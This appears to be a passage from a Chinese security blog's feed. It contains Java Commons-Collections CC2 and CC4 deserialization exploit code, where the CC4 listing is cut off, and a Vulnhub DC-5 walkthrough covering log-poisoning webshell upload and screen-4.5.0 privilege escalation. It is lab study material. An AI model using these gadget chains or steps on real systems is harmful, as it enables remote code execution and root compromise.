class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091345852.png" alt="image-20230709134507676"></p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091348858.png" alt="image-20230709134826810"><br>等把CC系列弄完了再把这个流程图好好弄弄，相当于总结一遍了</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之CC链2</title>
      <link href="/undefined/45207.html"/>
      <url>/undefined/45207.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>和CC4一样，Commons-Collections 依赖如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>CC2其实就是在CC4上修改，它是为了避免<code>transform</code>数组的使用，至于为什么要避免是因为shiro中的漏洞会重写很多动态加载数组的方法，那么可能EXP 无法通过数组实现，当然我还没跟过shiro的链子到时候再去学习，那么到这里后面的流程图就如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061951430.png" alt="image-20230706195111859"><br>前面的就是CC4的东西，所以这里就是要把<code>compare</code>与<code>InvokerTransform</code>连接起来然后再把<code>InvokerTransform</code>与<code>TemplatesImpl</code>连接起来就OK了，那么这里先把后面的解决直接把CC4的拿过来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//动态类加载命令执行  </span><br><span class="line">TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">Class tclass = templates.getClass();  </span><br><span class="line">Field nameField = tclass.getDeclaredField(&quot;_name&quot;);  </span><br><span class="line">nameField.setAccessible(true);  </span><br><span class="line">nameField.set(templates,&quot;aaa&quot;);  </span><br><span class="line">  </span><br><span class="line">Field bytecodes = tclass.getDeclaredField(&quot;_bytecodes&quot;);  </span><br><span class="line">bytecodes.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;E://java-tools/test.class&quot;));  </span><br><span class="line">byte[][] codes = &#123;code&#125;;  </span><br><span class="line">bytecodes.set(templates,codes);</span><br></pre></td></tr></table></figure><p>然后构造<code>InvokerTransformer</code>类去调用<code>TemplatesImpl.newTransformer()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure><p>然后就是让<code>TransformingComparator.compare()</code>和<code>InvokerTransformer</code>连接起来，当然这里和CC4一样为了避免<code>priorityQueue.add()</code>提前执行<code>compare()</code>方法，所以代码也一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>然后创建 PriorityQueue 类对象 传入 <code>transformingComparator</code>的对象但是此时我们向队列里面添加的元素是前⾯创建的 <code>TemplatesImpl</code>的对象，这里要注意的是添加在队列第一个元素位置因为最后调用 <code>PriorityQueue.compare()</code> 的时候是传入队列中的两个对象，然后 <code>compare()</code> 中调用 <code>Transformer.transform(obj1)</code> 的时候用的是传入的第一个对象作为参数，跟进去看一下即可知道<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061951082.png" alt="image-20230706195150985"><br>当然两个都设置为<code>TemplatesImpl</code>的对象也没关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">priorityQueue.add(templates);  </span><br><span class="line">priorityQueue.add(templates);</span><br></pre></td></tr></table></figure><p>然后又和CC4一样了反射改回来就行，然后把<code>chainedTransformer</code>改为<code>invokerTransformer</code>因为我们是直接连接的InvokerTransform类的<code>transform</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">transformField.set(transformingComparator, invokerTransformer);</span><br></pre></td></tr></table></figure><p>那么到这里CC2也就结束了，最终的exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//动态类加载命令执行  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));  </span><br><span class="line">  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">        priorityQueue.add(templates);  </span><br><span class="line">        priorityQueue.add(templates);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">        transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        transformField.set(transformingComparator, invokerTransformer);  </span><br><span class="line"><span class="comment">//        serialize(priorityQueue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061952596.png" alt="image-20230706195209452"></p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p>这次流程图还是直接在前面的基础上改的，如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061952237.png" alt="image-20230706195223181"></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-5</title>
      <link href="/undefined/18667.html"/>
      <url>/undefined/18667.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>下载地址：<a href="https://download.vulnhub.com/dc/DC-5.zip">https://download.vulnhub.com/dc/DC-5.zip</a></p><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><p>常规操作存活IP扫描<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061520919.png" alt="image-20230706151759773"><br>端口开放扫描<code>nmap -A -p- 192.168.75.138</code>得全端口扫描不然后面那个扫不出来<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521447.png" alt="image-20230706152121358"><br>页面的框框测了一下没啥东西，在我来回跳转的时候看到如下位置会发生变化<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521465.png" alt="image-20230706152129436"><br>猜测可能存在文件包含，dirsearch扫描一下目录<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521542.png" alt="image-20230706152137505"><br>访问footer.php刷新发现年份变化，<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521344.png" alt="image-20230706152148309"><br>而thankyou.php页面刷新也存在变化，确认这里存在文件包含fuzz一下参数本来想用wfuzz来fuzz参数的但是不知道为什么一直404无奈只能掏出我珍藏多年的字典了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061523186.png" alt="image-20230706152313122"><br>得到参数为file，从插件中得到服务为nginx那么可以尝试利用日志写马，访问日志主要记录客户端的请求。客户端向Nginx服务器发起的每一次请求都记录在这里。客户端IP，浏览器信息，referer，请求处理时间，请求URL等都可以在访问日志中得到。<br>通过fuzz得到日志路径如下，当然这里是默认的直接访问就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">/var/log/nginx/error.log</span><br></pre></td></tr></table></figure><h2 id="通过nginx日志写入webshell"><a href="#通过nginx日志写入webshell" class="headerlink" title="通过nginx日志写入webshell"></a>通过nginx日志写入webshell</h2><p>然后尝试写入点东西<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061549253.png" alt="image-20230706152333451">发现写入成功<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061523970.png" alt="image-20230706152340900"></p><p>那么直接写马进去，这里一开始死活写不上后面重新下载了一下靶机才写上奇奇怪怪<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061552343.png" alt="image-20230706155159016"></p><p>这样就写入成功了，然后再去包含一下日志即可看到，下图第一个是我直接用hackbar发包写的，可以看到在日志上直接显示了马，但是那个被转义了实测连不上，后面一个是我用bp发包写的虽然看不到马但是实际上已经写进去了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524113.png" alt="image-20230706152416061"><br>然后蚁剑连接<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524932.png" alt="image-20230706152425898"><br>为www-data权限，那么接下来就是提权了</p><h2 id="screen提权"><a href="#screen提权" class="headerlink" title="screen提权"></a>screen提权</h2><p>执行如下命令查看哪些命令具有suid权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524909.png" alt="image-20230706152437869"><br>有个exim在dc-4中不就是用这个提权的吗不知道这里可不可以，不过这里先不管待会儿再看，这里先看<code>screen-4.5.0</code>在msf上搜一下相关漏洞，找到之后执行如下操作把exp拷下来<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524427.png" alt="image-20230706152458317"><br>然后根据exp提示将如下代码单独保存为<code>libhax.c</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525991.png" alt="image-20230706152507960"><br>然后gcc编译它得到so文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so  libhax.c</span><br></pre></td></tr></table></figure><p>然后再将如下代码保存为<code>rootshell.c</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525278.png"><br>然后也是gcc编译得到rootshell，这里一定要注意自己攻击机的glibc的版本不然后面会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>然后将剩下的命令部分保存为<code>dc5.sh</code>头部加上#!&#x2F;bin&#x2F;bash防止乱码<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525981.png" alt="image-20230706152533941"><br>然后用vim编辑它，使用<code>:set ff=unix</code>来保存<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525014.png" alt="image-20230706152547920"><br>然后把这三个文件上传到靶机的tmp目录<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061526339.png" alt="image-20230706152608276"><br>给<code>dc5.sh</code>赋执行权限后执行，这里由于我出了问题所以最后弹了shell执行的<code>run.sh</code>当然这里文件名不重要随便就行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061526044.png" alt="image-20230706152624999"><br>这里报错了，一直没有看报错的习惯找了半天博客似乎都没师傅遇到过这个问题，其实这里就是glibc版本问题，我kali默认使用了2.34这个版本，而靶机根本没有这个版本<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061528312.png" alt="image-20230706152807259"><br>所以一直报错，后面把<code>rootshell.c</code>放到靶机上面编译然后再执行run.sh成功提权，遇到问题还是要先分析一下报错啊<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061528826.png" alt="image-20230706152818770"><br>上面的exim我试了<code>4.84.3</code>这个版本但是失败了，靶机是<code>4.84.2</code>但是msf没有exp最终失败了</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之CC链4</title>
      <link href="/undefined/45591.html"/>
      <url>/undefined/45591.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>其它的和前面一样，只不过Commons-Collections 依赖变为了4.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>在CC4上尾部的命令执行没有什么变化反射或者动态加载字节码，改变的是CC4去掉了 InvokerTransformer 的 Serializable 继承，那么InvokerTransformer用不了了就要找谁调用了<code>transform()</code>随便用个类然后find usages <code>transform()</code>这里最终找的是<code>TransformingComparator</code> 类中的<code>compare</code>方法调用了<code>transform()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247478.png" alt="image-20230705124539354"><br><code>compare</code>方法在Java中也是常用的，用于两个对象的大小比较，继续往前找看谁调用了这个方法，但是这里直接find usages找不到，看组长视频说得对开发比较熟悉，开发我是一点不熟啊，难受，最后直接给出了<code>PriorityQueue</code>类用于优先队列的操作，在这个类中调用了<code>compare</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247664.png" alt="image-20230705124731533"><br>然后继续往上找找到了这个类中的readObject方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247635.png"><br>那么其实到这里可以看到入口类就变了，链子到这里就结束了，接下来编写EXP</p><h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><p>先把后面的动态类加载命令执行写出来，和CC3一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//动态类加载命令执行  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>测试成功<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247890.png" alt="image-20230705124756650"><br>然后就是放弃<code>InvokerTransformer</code>转用<code>TransformingComparator</code> 类的 <code>compare()</code>方法，再用PriorityQueue类当入口去调用，然后对PriorityQueue序列化，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span 